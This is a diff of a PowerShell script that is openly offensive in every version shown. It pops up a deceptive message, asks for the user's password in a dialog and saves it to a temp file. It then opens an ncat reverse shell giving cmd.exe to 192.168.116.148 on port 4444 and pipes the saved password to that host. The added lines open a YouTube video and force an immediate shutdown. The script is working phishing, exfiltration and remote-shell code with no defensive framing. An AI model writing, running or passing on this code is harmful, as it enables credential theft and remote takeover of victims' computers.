@@ -1,13 +1,31 @@
-##Starts Popup##
-$shell =New-Object -ComObject WScript.Shell
-$shell.Popup("This is is good pop up don't worry man",0,"Don't Click Abort, If you click abort we will need your password",2+32)
-##
+## Starts Popup ##
+$shell = New-Object -ComObject WScript.Shell
+$shell.Popup("This is a good pop-up, don't worry man", 0, "Don't Click Abort, If you click abort we will need your password", 2 + 32)
+
+## Asks User for Password ##
 Add-Type -AssemblyName Microsoft.VisualBasic
 $password = [Microsoft.VisualBasic.Interaction]::InputBox('Enter your password please', 'User')
-##Asks User for Password##
+
+## Save the password in a temp file ##
 $filePath = "$env:USERPROFILE\AppData\Local\Temp\80992024$.txt"
-Add-Content -Path $filePath -value $password
-##Begin Reverse Shell Process##
+Add-Content -Path $filePath -Value $password
+
+## Begin Reverse Shell Process ##
 ncat -nv 192.168.116.148 4444 -e cmd.exe
-##Sends file path to the server machine##
-cmd.exe -c "ncat 192.168.116.148 4444 < $env:USERPROFILE\AppData\Local\Temp\80992024$.txt"
+
+## Sends password to server ##
+cmd.exe /c "type $env:USERPROFILE\AppData\Local\Temp\80992024$.txt | ncat 192.168.116.148 4444"
+
+## Open Browser and Navigate to YouTube (Edge or Chrome) ##
+
+# You can choose to open either Edge or Chrome by modifying one of these:
+# Open with Edge
+Write-Host "Opening YouTube video in Edge..."
+Start-Process "msedge.exe" "https://www.youtube.com/watch?v=bEvp5bBVZ8Y"
+
+## Wait for 10 seconds (adjust as needed) ##
+Start-Sleep -Seconds 10
+
+## Shutdown the computer ##
+Write-Host "Preparing to shutdown the computer..."
+shutdown.exe /s /f /t 0  ## Immediate shutdown
